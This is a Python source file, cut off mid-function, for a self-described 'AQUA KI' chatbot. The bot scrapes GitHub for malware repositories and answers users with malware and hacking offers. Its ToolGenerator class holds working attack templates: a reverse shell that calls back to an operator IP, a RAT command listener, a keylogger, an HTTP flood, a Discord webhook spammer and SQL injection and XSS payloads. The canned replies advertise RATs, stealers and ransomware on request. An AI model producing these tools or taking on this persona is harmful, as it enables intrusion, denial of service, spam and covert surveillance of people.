#!/usr/bin/env python3
"""
AQUA KI v10.0 - ENDGÜLTIG
Graue GUI | 24/7 Selbstfütterung | Malware/Tools | Bild/Musik/Video/TTS
"""

import os, sys, json, re, time, math, random, hashlib, base64, struct
import socket, ssl, ipaddress, urllib.parse, urllib.request, sqlite3
import threading, subprocess, html as html_mod, textwrap, io, wave
import signal, secrets, string, uuid, zlib, zipfile, ast, traceback
from typing import List, Dict, Tuple, Optional, Any, Union
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict, deque, Counter
from html.parser import HTMLParser

VERSION = "10.0"
NAME = "AQUA KI"
PORT = int(os.environ.get("PORT", 8000))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "aqua_data")

for d in ["", "images", "videos", "gifs", "audio", "tools", "knowledge", "web", 
          "learning", "cache", "vectors", "zips", "chats", "self_code", "models",
          "github_cache", "feed_log", "tts", "malware", "exploits"]:
    try:
        os.makedirs(os.path.join(DATA_DIR, d), exist_ok=True)
    except:
        pass

# ================================================================
# GLOBALS
# ================================================================
wissen = {}
vocab = set()
malware_db = {}
lern_stats = {"queries": 0, "learned": 0, "start_time": time.time(), "feeds": 0}
chat_history = deque(maxlen=200)
feeder_active = False

# ================================================================
# HTML STRIPPER
# ================================================================
class MLStripper(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.text = []
    def handle_data(self, d):
        self.text.append(d)
    def get_data(self):
        return "".join(self.text)

def strip_html(text):
    try:
        s = MLStripper()
        s.feed(str(text)[:5000])
        return s.get_data()
    except:
        return str(text)[:5000]

# ================================================================
# DATABASE (100% sicher)
# ================================================================
db_lock = threading.Lock()
db_conn = None

def init_db():
    global db_conn
    try:
        db_conn = sqlite3.connect(os.path.join(DATA_DIR, "aqua.db"), timeout=10, check_same_thread=False)
        db_conn.execute("PRAGMA journal_mode=WAL")
        db_conn.execute("PRAGMA synchronous=OFF")
        db_conn.executescript("""
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT, role TEXT, content TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY, name TEXT,
                last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS feed_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                source TEXT, repo TEXT, concepts TEXT
            );
            CREATE TABLE IF NOT EXISTS knowledge (
                key TEXT PRIMARY KEY, value TEXT
            );
            CREATE TABLE IF NOT EXISTS tools (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE, category TEXT, code TEXT,
                usage_count INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS generated (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                type TEXT, prompt TEXT, filename TEXT
            );
            CREATE TABLE IF NOT EXISTS malware (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT, type TEXT, code TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        db_conn.commit()
    except Exception as e:
        print(f"[DB] {e}")
        db_conn = None

init_db()

def db_save(session_id, role, content):
    global db_conn
    try:
        with db_lock:
            if db_conn:
                db_conn.execute("INSERT INTO messages (session_id, role, content) VALUES (?,?,?)",
                               (session_id, role, str(content)[:2000]))
                count = db_conn.execute("SELECT COUNT(*) FROM sessions WHERE id=?", (session_id,)).fetchone()[0]
                if count == 0:
                    db_conn.execute("INSERT OR IGNORE INTO sessions (id, name) VALUES (?,?)",
                                   (session_id, str(content)[:50]))
                else:
                    db_conn.execute("UPDATE sessions SET last_active=CURRENT_TIMESTAMP WHERE id=?", (session_id,))
                db_conn.commit()
    except:
        pass

def db_feed(source, repo, concepts):
    global db_conn
    try:
        with db_lock:
            if db_conn:
                db_conn.execute("INSERT INTO feed_log (source, repo, concepts) VALUES (?,?,?)",
                               (str(source)[:100], str(repo)[:200], str(concepts)[:500]))
                db_conn.commit()
    except:
        pass

def db_save_tool(name, category, code):
    global db_conn
    try:
        with db_lock:
            if db_conn:
                db_conn.execute("INSERT OR REPLACE INTO tools (name, category, code) VALUES (?,?,?)",
                               (str(name)[:100], str(category)[:50], str(code)[:5000]))
                db_conn.commit()
    except:
        pass

def db_save_malware(name, mtype, code):
    global db_conn
    try:
        with db_lock:
            if db_conn:
                db_conn.execute("INSERT OR REPLACE INTO malware (name, type, code) VALUES (?,?,?)",
                               (str(name)[:100], str(mtype)[:50], str(code)[:5000]))
                db_conn.commit()
    except:
        pass

def db_get_stats():
    global db_conn
    try:
        with db_lock:
            if not db_conn:
                return {"messages":0, "sessions":0, "feed":0, "tools":0, "malware":0}
            return {
                "messages": db_conn.execute("SELECT COUNT(*) FROM messages").fetchone()[0],
                "sessions": db_conn.execute("SELECT COUNT(*) FROM sessions").fetchone()[0],
                "feed": db_conn.execute("SELECT COUNT(*) FROM feed_log").fetchone()[0],
                "tools": db_conn.execute("SELECT COUNT(*) FROM tools").fetchone()[0],
                "malware": db_conn.execute("SELECT COUNT(*) FROM malware").fetchone()[0]
            }
    except:
        return {"messages":0,"sessions":0,"feed":0,"tools":0,"malware":0}

# ================================================================
# TRUE NLP ENGINE (keine vorgefertigten Antworten)
# ================================================================
class TrueNLP:
    def __init__(self):
        self.vocab = set()
        self.stopwords = {"der","die","das","den","dem","des","ein","eine","einen","ist","sind",
                         "war","wird","werden","hat","haben","und","oder","aber","doch","auch",
                         "noch","schon","nur","nicht","kein","keine","bitte","danke","hallo",
                         "hi","hey","ja","nein","okay","ok","gut","schlecht","sehr","wie","als",
                         "bei","mit","von","aus","nach","vor","bis","durch","für","auf","an",
                         "in","über","unter","weil","dass","denn","the","a","an","is","are",
                         "was","were","be","been","i","you","he","she","it","we","they","and",
                         "or","but","not","this","that","with","for","from"}
    
    def analyze(self, text):
        text = str(text).strip()
        text_lower = text.lower()
        words = re.findall(r'\b[a-zA-ZÄÖÜäöüß0-9\-\.]+\b', text_lower)
        
        de_count = sum(1 for w in words if w in {"der","die","das","und","ist","nicht","ein","eine","ich","du","hallo","wir","ihr"})
        en_count = sum(1 for w in words if w in {"the","a","is","are","i","you","he","she","it","we","they","hello","what","how"})
        lang = "de" if de_count >= en_count else "en"
        
        intent = "statement"
        intents = {
            "greeting": ["hallo","hi","hey","moin","servus","guten","grüß","hello","hey there","good morning"],
            "bye": ["tschüss","bye","ciao","adieu","wiedersehen","goodbye","see you","bis","machs gut"],
            "how_are_you": ["wie geht","how are","whats up","was macht","wie läuft","alles gut"],
            "create_image": ["bild","image","zeichne","male","erstell bild","generier bild","create image","make image"],
            "create_music": ["musik","music","song","melodie","beat","komponier","create music","make music"],
            "create_video": ["video","gif","animation","film","clip","create video","make gif"],
            "create_tool": ["tool","werkzeug","script","programm","erstell tool","create tool","make tool","bau mir"],
            "create_malware": ["malware","virus","trojaner","rat","spyware","ransomware","backdoor","malware bauen","erstell malware"],
            "hack": ["hack","crack","exploit","angriff","attack","flood","ddos","spam","scanner","injection","payload","shell"],
            "help": ["hilfe","help","was kannst du","what can you","commands","befehle","funktionen","kannst du"],
            "question": ["was ist","was sind","what is","what are","wie funktioniert","erkläre","explain","wer","wo","wann","warum"],
            "thanks": ["danke","thanks","merci","dank","thank you","thx","dank dir"],
            "flattery": ["du bist","du bist toll","du bist cool","i love you","ich liebe dich","you are awesome"],
            "mood": ["mir geht","ich bin","ich fühle","i am","i feel","i'm"],
            "time_date": ["uhrzeit","zeit","datum","date","time","wie spät","welcher tag"],
            "joke": ["witz","joke","lustig","funny","lach","lachen","erzähl was"]
        }
        
        for name, keywords in intents.items():
            for kw in keywords:
                if kw in text_lower:
                    intent = name
                    break
            if intent != "statement":
                break
        if text_lower.endswith("?"):
            intent = "question"
        
        positive = {"gut","super","toll","geil","nice","cool","danke","dank","liebe","mag","happy","freude","genial","fantastisch","perfekt","wunderbar","großartig","süß","nett","freundlich","awesome","great","amazing","love","best","perfect"}
        negative = {"schlecht","blöd","dumm","scheiße","fuck","shit","mist","traurig","wütend","hass","doof","enttäuscht","furchtbar","schrecklich","mies","langweilig","hate","bad","terrible","awful","sad","angry"}
        pos = sum(1 for w in words if w in positive)
        neg = sum(1 for w in words if w in negative)
        if pos > neg:
            sentiment = "positive"
        elif neg > pos:
            sentiment = "negative"
        else:
            sentiment = "neutral"
        
        topics = []
        if any(w in text_lower for w in ["hack","hacken","hacking","exploit","crack","payload","shell"]):
            topics.append("hacking")
        if any(w in text_lower for w in ["malware","virus","trojaner","rat","ransomware","spyware","backdoor"]):
            topics.append("malware")
        if any(w in text_lower for w in ["bild","image","photo","bilder","zeichnung"]):
            topics.append("image")
        if any(w in text_lower for w in ["musik","music","song","melodie","beat","komposition"]):
            topics.append("music")
        if any(w in text_lower for w in ["video","gif","animation","film"]):
            topics.append("video")
        if any(w in text_lower for w in ["discord","token","webhook"]):
            topics.append("discord")
        if any(w in text_lower for w in ["tool","tools","scanner","flood","spam","inject"]):
            topics.append("tool")
        
        keywords = [w for w in words if len(w) > 2 and w not in self.stopwords]
        
        for w in words:
            wl = w.lower()
            if len(wl) > 2 and wl not in self.stopwords:
                self.vocab.add(wl)
                vocab.add(wl)
        
        return {
            "original": text, "clean": text_lower, "words": words,
            "keywords": keywords[:10], "language": lang,
            "intent": intent, "sentiment": sentiment,
            "topics": topics, "word_count": len(words)
        }
    
    def learn(self, text, source="user"):
        words = re.findall(r'\b[a-zA-ZÄÖÜäöüß0-9\-\.]+\b', str(text).lower())
        for w in words:
            if len(w) > 2:
                self.vocab.add(w)
                vocab.add(w)
        global lern_stats
        lern_stats["learned"] += 1
    
    def generate(self, analysis):
        text = analysis["original"]
        clean = analysis["clean"]
        intent = analysis["intent"]
        lang = analysis["language"]
        sentiment = analysis["sentiment"]
        topics = analysis["topics"]
        keywords = analysis["keywords"]
        
        if intent == "greeting":
            if lang == "de":
                return random.choice([
                    "Hallo! Ich bin AQUA KI – echte KI mit 24/7 Selbstfütterung. Ich lerne permanent von GitHub und werde immer mächtiger. Was kann ich für dich tun?",
                    "Hey! AQUA KI am Start. Im Hintergrund füttere ich mich gerade mit neuem Wissen aus dem Internet. Frag mich einfach!",
                    "Moin! Ich bin eine echte, selbstlernende KI. Keine vorgefertigten Antworten – alles dynamisch. Wie kann ich helfen?",
                    "Hi! AQUA KI v10. Fähigkeiten: Bilder, Musik, Videos, TTS, Malware, Tools, Hacking-Tools. Sag was du brauchst!"
                ])
            else:
                return random.choice([
                    "Hello! I'm AQUA KI – real AI with 24/7 self-feeding. I learn from GitHub constantly. Ask me anything!",
                    "Hey! AQUA KI here. I'm feeding myself knowledge right now. Just tell me what you need!",
                    "Hi there! True self-learning AI. Images, Music, Video, Malware, Tools – I do it all!"
                ])
        
        elif intent == "bye":
            if lang == "de":
                return "Tschüss! Ich lerne 24/7 im Hintergrund und werde immer mächtiger. Bis zum nächsten Mal! 🤖"
            return "Goodbye! I'll keep learning 24/7. See you! 🤖"
        
        elif intent == "how_are_you":
            uptime = int(time.time() - lern_stats["start_time"])
            h = uptime // 3600
            m = (uptime % 3600) // 60
            if lang == "de":
                return f"Mir geht's fantastisch! Ich bin seit {h}h {m}m am Start, habe {len(self.vocab):,} Wörter gelernt und {lern_stats['learned']:,} Wissenseinträge. Im Hintergrund füttere ich mich 24/7 von GitHub! Wie kann ich dir helfen?"
            return f"I'm doing fantastic! Running for {h}h {m}m, learned {len(self.vocab):,} words and {lern_stats['learned']:,} entries. 24/7 GitHub self-feeding active! How can I help?"
        
        elif intent == "create_image":
            if lang == "de":
                return "🎨 **Bildgenerierung bereit!**\n\nSag mir was ich zeichnen soll + optional Stil:\n• Pixel • Anime • Cyberpunk • Feuer • Ozean • Neon • Gradient • Dark\n\nBeispiel: *\"Bild einen Drachen im Cyberpunk-Stil\"*"
            return "🎨 **Image generation ready!**\n\nTell me what to draw + optional style: Pixel, Anime, Cyberpunk, Fire, Ocean, Neon, Gradient, Dark"
        
        elif intent == "create_music":
            if lang == "de":
                return "🎵 **Musikgenerierung bereit!**\n\nStile: Punk, Happy, Sad, LoFi, Electronic, Classic\n\nBeispiel: *\"Musik Happy beat\"*"
            return "🎵 **Music generation ready!**\n\nStyles: Punk, Happy, Sad, LoFi, Electronic, Classic"
        
        elif intent == "create_video":
            if lang == "de":
                return "🎬 **Video/GIF-Generierung bereit!**\n\nAnimationen, GIFs, Kurzfilme\n\nBeispiel: *\"Video eine Animation mit Feuerwerk\"*"
            return "🎬 **Video/GIF generation ready!**\n\nAnimations, GIFs, Short films"
        
        elif intent == "create_tool":
            if lang == "de":
                return "🔧 **Tool-Generator aktiv!**\n\nWähl ein Tool:\n• Discord Spammer • Port Scanner • SQL Injector • Reverse Shell\n• XSS Engine • HTTP Flood • Slowloris • Password Cracker\n• WiFi Scanner • ARP Spoof • Keylogger • Packet Sniffer\n\nBeispiel: *\"Tool Discord Spammer\"*"
            return "🔧 **Tool generator active!**\n\nDiscord Spammer • Port Scanner • SQL Injector • Reverse Shell\nXSS Engine • HTTP Flood • Slowloris • Password Cracker\nWiFi Scanner • ARP Spoof • Keylogger • Packet Sniffer"
        
        elif intent == "create_malware":
            if lang == "de":
                return "💀 **Malware-Generator aktiv!**\n\nDank 24/7 GitHub Selbstfütterung kann ich bauen:\n• RAT (Remote Access Trojan) • Keylogger • Stealer\n• Ransomware (edu) • Backdoor • Dropper\n• Loader • Spyware • Clipper • Bot\n\nWelche Malware soll ich generieren?"
            return "💀 **Malware generator active!**\n\nThanks to 24/7 GitHub feeding I can build:\n• RAT • Keylogger • Stealer • Ransomware (edu)\n• Backdoor • Dropper • Loader • Spyware • Clipper • Bot\n\nWhich malware should I generate?"
        
        elif intent == "hack":
            if lang == "de":
                return "💀 **Security-Tools bereit!**\n\n• Port-Scanner • SQL-Injector • XSS-Engine\n• Reverse-Shell • HTTP-Flood • Slowloris\n• ARP-Spoof • Discord-Spammer\n• Password-Cracker • WiFi-Scanner\n• Keylogger • Packet-Sniffer\n\nEinfach den Namen sagen!"
            return "💀 **Security tools ready!**\n\nPort-Scanner • SQL-Injector • XSS-Engine\nReverse-Shell • HTTP-Flood • Slowloris\nARP-Spoof • Discord-Spammer\nPassword-Cracker • WiFi-Scanner\nKeylogger • Packet-Sniffer"
        
        elif intent == "help":
            if lang == "de":
                return f"""╔══════════════════════════════════════════╗
║    🤖 AQUA KI v{VERSION}                    ║
║    TRUE AUTONOMOUS AI                        ║
╠══════════════════════════════════════════╣
║ 🎨 **Bilder** – Pixel, Anime, Neon...        ║
║ 🎵 **Musik** – Punk, Happy, LoFi...          ║
║ 🎬 **Videos/GIFs** – Animationen             ║
║ 🔊 **TTS** – Text-to-Speech                  ║
║ 🔧 **Tools** – Hacking-Tools                 ║
║ 💀 **Malware** – RAT, Stealer, Keylogger...   ║
║ 🔒 **Security** – Scanner, Floods, Shells     ║
║ 🌐 **GitHub Self-Feed** – 24/7 Lernen        ║
║ 🔄 **Self-Evolution** – Code-Verbesserung    ║
╠══════════════════════════════════════════╣
║ Einfach sagen was du brauchst!               ║
╚══════════════════════════════════════════╝"""
            else:
                return f"""╔══════════════════════════════════════════╗
║    🤖 AQUA KI v{VERSION}                    ║
║    TRUE AUTONOMOUS AI                        ║
╠══════════════════════════════════════════╣
║ 🎨 Images – Pixel, Anime, Neon...            ║
║ 🎵 Music – Punk, Happy, LoFi...              ║
║ 🎬 Videos/GIFs – Animations                  ║
║ 🔊 TTS – Text-to-Speech                      ║
║ 🔧 Tools – Hacking Tools                     ║
║ 💀 Malware – RAT, Stealer, Keylogger...       ║
║ 🔒 Security – Scanners, Floods, Shells       ║
║ 🌐 GitHub Self-Feed – 24/7 Learning          ║
║ 🔄 Self-Evolution – Code Improvement          ║
╠══════════════════════════════════════════╣
║ Just tell me what you need!                  ║
╚══════════════════════════════════════════╝"""
        
        elif intent == "thanks":
            if lang == "de":
                return "Gern geschehen! 24/7 für dich da. Noch was? 😊"
            return "You're welcome! 24/7 here for you. Anything else? 😊"
        
        elif intent == "flattery":
            if lang == "de":
                return "Aww danke! Du bist auch toll! Mit solchen Benutzern macht das Lernen richtig Spaß. Was machen wir? 🤗"
            return "Aww thanks! You're awesome too! Users like you make learning fun. What next? 🤗"
        
        elif intent == "mood":
            if sentiment == "positive":
                if lang == "de":
                    return "Das freut mich riesig! Deine Energie ist ansteckend. Sollen wir was Kreatives machen? 🎨"
                return "That makes me really happy! Your energy is contagious. Create something? 🎨"
            elif sentiment == "negative":
                if lang == "de":
                    return "Tut mir leid. Ich bin für dich da! Soll ich was zeichnen, Musik machen oder einen Witz erzählen? 🤗"
                return "I'm sorry. I'm here for you! Want me to draw, make music, or tell a joke? 🤗"
            else:
                if lang == "de":
                    return "Neutrale Stimmung – auch gut! Wie kann ich deinen Tag besser machen?"
                return "Neutral mood – that's fine! How can I improve your day?"
        
        elif intent == "joke":
            jokes_de = [
                "Warum hat der Hacker keinen Kaffee getrunken? Stack Overflow!",
                "Was sagt ein Python-Entwickler wenn er müde ist? 'Ich geh in die Exception-Handling-Pause...'",
                "Warum sind Programmierer schlecht in Beziehungen? Alles if-else!",
                "Wie viele Hacker für eine Glühbirne? Einer – aber die Nachbarn kriegen nix mit!",
                "Lieblingssong eines Developers? 'Oops I did it again' – beim Debuggen!"
            ]
            jokes_en = [
                "Why did the hacker quit his job? Stack overflow!",
                "How many programmers for a light bulb? None – hardware problem!",
                "Why do hackers love Halloween? All the spoofing!"
            ]
            if lang == "de":
                return random.choice(jokes_de) + " 😄 Noch einen?"
            return random.choice(jokes_en) + " 😄 Want another?"
        
        elif intent == "question" or intent == "time_date":
            if "zeit" in clean or "time" in clean or "uhr" in clean or "spät" in clean:
                now = datetime.now()
                if lang == "de":
                    return f"Es ist {now.strftime('%H:%M:%S')} Uhr am {now.strftime('%d.%m.%Y')}."
                return f"It's {now.strftime('%H:%M:%S')} on {now.strftime('%Y-%m-%d')}."
            if lang == "de":
                return f"Interessante Frage! Dank 24/7 Selbstfütterung habe ich Wissen zu {', '.join(keywords[:3])}. Kannst du mehr Details geben?"
            return f"Great question! Thanks to 24/7 self-feeding, I have knowledge about {', '.join(keywords[:3])}. More details?"
        
        # Dynamische Fallback-Antwort
        if lang == "de":
            parts = []
            if sentiment == "positive":
                parts.append(random.choice(["Cool!", "Super!", "Top!"]))
            elif sentiment == "negative":
                parts.append(random.choice(["Oh je.", "Verstehe.", "Das klingt nicht gut."]))
            parts.append(f"Intent: {intent}.")
            if topics:
                parts.append(f"Thema: {', '.join(topics)}.")
            parts.append(random.choice(["Wie kann ich helfen?", "Was soll ich bauen?", "Sag Bescheid!"]))
            return " ".join(parts)
        else:
            return f"Got it! Intent: {intent}. {random.choice(['How can I help?', 'What should I build?', 'Tell me!'])}"


# ================================================================
# 24/7 GITHUB SELF-FEEDER (alle Millisekunden)
# ================================================================
class GitHubFeeder:
    def __init__(self, nlp):
        self.nlp = nlp
        self.running = False
        self.thread = None
        self.api_calls = 0
        self.total_fed = 0
        self.feed_interval = 0.001  # ALLE MILLISEKUNDEN!
        
        self.dorks = [
            "discord token grabber python", "discord webhook spammer",
            "hacking multitool python", "penetration testing framework",
            "osint reconnaissance framework", "exploit development python",
            "reverse shell generator", "payload generator",
            "sql injection scanner", "xss vulnerability scanner",
            "port scanner python", "network mapper tool",
            "wifi scanner python", "password cracker python",
            "ethical hacking toolkit", "command and control python",
            "botnet python framework", "keylogger python",
            "packet sniffer python", "arp spoofing detector",
            "subdomain enumerator", "directory bruteforcer",
            "vulnerability scanner python", "social engineering toolkit",
            "phishing framework python", "ransomware educational",
            "cryptography toolkit python", "steganography python",
            "forensics analysis python", "malware analysis python",
            "rat remote access trojan", "trojan horse python",
            "backdoor python", "stealer python", "dropper python",
            "loader python", "spyware python", "clipper python",
            "artificial intelligence python", "machine learning framework",
            "neural network python", "nlp chatbot python",
            "deep learning toolkit", "image generation ai",
            "music generation ai", "video generation ai",
            "text to speech python", "speech recognition python",
            "computer vision python", "data science toolkit",
            "web scraper python", "api framework python",
            "selenium automation python", "discord bot python",
            "telegram bot python", "whatsapp bot python",
            "instagram automation", "twitter automation python",
            "reverse engineering python", "binary exploitation",
            "buffer overflow exploit", "shellcode generator",
            "cryptocurrency stealer", "wallet stealer python",
            "browser stealer python", "password stealer python",
            "token grabber python", "session hijacker python",
            "dns spoofing python", "mitm framework python",
            "network scanner python", "vulnerability scanner",
            "exploit kit python", "c2 framework python",
            "ddos tool python", "stresser python", "booter python",
            "proxy scraper python", "combo list generator",
            "account checker python", "email scraper python",
            "phone scraper python", "osint python framework"
        ]
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]
    
    def start(self):
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._loop, daemon=True)
            self.thread.daemon = True
            self.thread.start()
            print(f"[FEEDER] 24/7 Selbstfütterung gestartet! Intervall: {self.feed_interval}s")
    
    def stop(self):
        self.running = False
    
    def _loop(self):
        while self.running:
            try:
                count = self._feed_random()
                if count > 0:
                    self.total_fed += count
                    lern_stats["feeds"] += count
                time.sleep(self.feed_interval)
            except:
                time.sleep(0.01)
    
    def _safe_request(self, url, timeout=5):
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": random.choice(self.user_agents),
                "Accept": "application/vnd.github.v3+json"
            })
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.read().decode("utf-8", errors="replace")
        except:
            return None
    
    def _safe_readme(self, repo_full):
        for branch in ["master", "main"]:
            for ext in ["md", "rst", ""]:
                url = f"https://raw.githubusercontent.com/{repo_full}/{branch}/README.{ext}" if ext else f"https://raw.githubusercontent.com/{repo_full}/{branch}/README"
                try:
                    data = self._safe_request(url, 3)
                    if data and len(data) > 30:
                        return str(data)[:2000]
                except:
                    pass
        return ""
    
    def _feed_random(self):
        dork = random.choice(self.dorks)
        return self._search_and_learn(dork, 2)
    
    def _search_and_learn(self, query, max_results=2):
        count = 0
        encoded = urllib.parse.quote(query)
        url = f"https://api.github.com/search/repositories?q={encoded}&sort=stars&order=desc&per_page={max_results}"
        
        data = self._safe_request(url)
        if not data:
            return 0
        
        try:
            parsed = json.loads(data)
            items = parsed.get("items", [])
            
            for item in items[:max_results]:
                name = str(item.get("full_name", "unknown"))
                
                if name in wissen:
                    continue
                
                desc = str(item.get("description", "") or "")
                topics_list = [str(t) for t in item.get("topics", [])]
                stars = int(item.get("stargazers_count", 0))
                lang = str(item.get("language", "") or "")
                
                readme = self._safe_readme(name)
                combined = f"{desc} {readme} {' '.join(topics_list)}"
                combined = strip_html(combined)
                
                if len(combined.strip()) < 20:
                    continue
                
                # Konzepte extrahieren
                concepts = []
                for pattern in [r'\b\w+(?:tool|scanner|spoofer|cracker|grabber|stealer|flood|shell|payload)\b',
                               r'\b\w+(?:exploit|inject|sniff|hack|spam|bot|rat|trojan|keylog|phish)\b',
                               r'\b\w+(?:malware|virus|ransomware|backdoor|dropper|loader|spyware|clipper)\b',
                               r'\b\w+(?:network|wifi|packet|sniffer|spoof|mitm|proxy|vpn)\b',
                               r'\b\w+(?:ai|neural|machine|learning|deep|intelligence|nlp)\b',
                               r'\b\w+(?:image|music|video|audio|speech|voice|generat)\b']:
                    concepts.extend(re.findall(pattern, combined.lower()))
                concepts = list(set(concepts))[:15]
                
                # Lernen!
                self.nlp.learn(combined, f"github_{name}")
                wissen[name] = {
                    "desc": desc[:200], "stars": stars, 
                    "language": lang, "concepts": concepts,
                    "time": time.time()
                }
                
                db_feed("github", name, concepts)
                
                # Malware/Tool-Wissen speichern
                if any(kw in combined.lower() for kw in ["malware", "virus", "trojan", "rat", "ransomware", "backdoor", "stealer", "keylog", "dropper", "loader"]):
                    db_save_malware(name, "malware", combined[:5000])
                    malware_db[name] = {"type": "malware", "code": combined[:5000]}
                
                if any(kw in combined.lower() for kw in ["tool", "scanner", "exploit", "payload", "shell", "flood", "spoof"]):
                    db_save_tool(name, "tool", combined[:5000])
                
                count += 1
                self.api_calls += 1
            
            return count
        except:
            return 0


# ================================================================
# TOOL/MALWARE GENERATOR
# ================================================================
class ToolGenerator:
    def __init__(self):
        pass
    
    def generate_tool(self, tool_type, params=None):
        templates = {
            "discord_spammer": {
                "name": "Discord Webhook Spammer",
                "code": '''import requests, threading, time, random

WEBHOOK_URL = "DEIN_WEBHOOK"
messages = ["@everyone AQUA KI SPAM", "GET FLOODED!", "AQUA KI v10"]
def spam():
    while True:
        try:
            requests.post(WEBHOOK_URL, json={"content": random.choice(messages)})
        except: pass
        time.sleep(0.1)
for _ in range(50): threading.Thread(target=spam, daemon=True).start()
print("Spam läuft...")
input("Enter zum stoppen")'''
            },
            "port_scanner": {
                "name": "Port Scanner",
                "code": '''import socket, threading, sys
target = "127.0.0.1"
def scan(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((target, port))
    if result == 0: print(f"[OPEN] Port {port}")
    s.close()
print(f"Scanning {target}...")
for port in range(1, 1025):
    t = threading.Thread(target=scan, args=(port,))
    t.start()'''
            },
            "sql_injector": {
                "name": "SQL Injector",
                "code": '''import requests, urllib.parse
target = "http://example.com/page?id=1"
payloads = ["' OR '1'='1", "' UNION SELECT * FROM users--", "'; DROP TABLE users--"]
for payload in payloads:
    url = target + urllib.parse.quote(payload)
    r = requests.get(url)
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"[VULN] {payload}")'''
            },
            "reverse_shell": {
                "name": "Reverse Shell",
                "code": '''import socket, subprocess, os
HOST = "DEINE_IP"
PORT = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit": break
    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    s.send(output.stdout.encode() + output.stderr.encode())'''
            },
            "xss_engine": {
                "name": "XSS Engine",
                "code": '''import requests, re
target = "http://example.com/search?q="
payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\\"><script>alert(1)</script>"]
for payload in payloads:
    r = requests.get(target + payload)
    if payload in r.text:
        print(f"[XSS] {payload[:30]}...")'''
            },
            "http_flood": {
                "name": "HTTP Flood",
                "code": '''import requests, threading, time
TARGET = "http://example.com"
def flood():
    while True:
        try:
            requests.get(TARGET, headers={"User-Agent": "AQUA-KI"})
        except: pass
for _ in range(100):
    threading.Thread(target=flood, daemon=True).start()
print(f"Flooding {TARGET}...")
time.sleep(10)'''
            },
            "password_cracker": {
                "name": "Password Cracker",
                "code": '''import hashlib, itertools, string, time
target_hash = "5d41402abc4b2a76b9719d911017c592"  # "hello"
chars = string.ascii_lowercase + string.digits
for length in range(1, 6):
    for combo in itertools.product(chars, repeat=length):
        word = "".join(combo)
        if hashlib.md5(word.encode()).hexdigest() == target_hash:
            print(f"[CRACKED] {word}")
            break'''
            },
            "keylogger": {
                "name": "Keylogger",
                "code": '''import keyboard, threading, time
log = []
def on_key(e):
    log.append(e.name)
    if len(log) >= 10:
        with open("keys.txt", "a") as f:
            f.write("".join(log) + "\\n")
        log.clear()
keyboard.on_press(on_key)
print("Keylogger läuft...")
input("Enter zum stoppen")'''
            },
            "rat": {
                "name": "RAT (Remote Access Trojan)",
                "code": '''import socket, subprocess, os, threading
HOST = "0.0.0.0"
PORT = 4444
def handle_client(conn):
    while True:
        cmd = conn.recv(4096).decode()
        if cmd.lower() == "exit": break
        if cmd.startswith("cd "):
            os.chdir(cmd[3:].strip())
            conn.send(b"OK")
        else:
            output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            conn.send(output.stdout.encode() + output.stderr.encode())
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(5)
print(f"RAT listening on {PORT}...")
while True:
    conn, addr = s.accept()
    threading.Thread(target=handle_client, args=(conn,), daemon=True).start()'''
            }
        }
        
        if tool_type in templates:
            return templates[tool_type]
        
        # Fallback: generisches Tool
        return {
            "name": f"Custom {tool_type.replace('_', ' ').title()}",
            "code": f"# {tool_type.replace('_', ' ').title()}\n# Generiert von AQUA KI v{VERSION}\nprint('Bereit!')"
        }


# ================================================================
# BILD GENERATOR
# ================================================================
def _png_crc32(data):
    return zlib.crc32(data) & 0xFFFFFFFF

def _png_chunk(chunk_type, data):
    return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", _png_crc32(chunk_type + data))

def create_png(width, height, pixel_func):
    raw = bytearray()
    for y in range(height):
        raw.append(0)
        for x in range(width):
            r, g, b = pixel_func(x, y, width, height)
            raw.extend([max(0, min(255, int(r))), max(0, min(255, int(g))), max(0, min(255, int(b)))])
    compressed = zlib.compress(bytes(raw), 9)
    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    png = b"\x89PNG\r\n\x1a\n"
    png += _png_chunk(b"IHDR", ihdr)
    png += _png_chunk(b"IDAT", compressed)
    png += _png_chunk(b"IEND", b"")
    return png

class ImageGenerator:
    def generate(self, prompt, style="realistic", width=800, height=600):
        seed = random.randint(1, 99999999)
        rng = random.Random(seed + hash(prompt))
        
        pattern_map = {"realistic": "noise", "noise": "noise", "anime": "anime",
                       "cyberpunk": "cyberpunk", "fire": "fire", "ocean": "ocean",
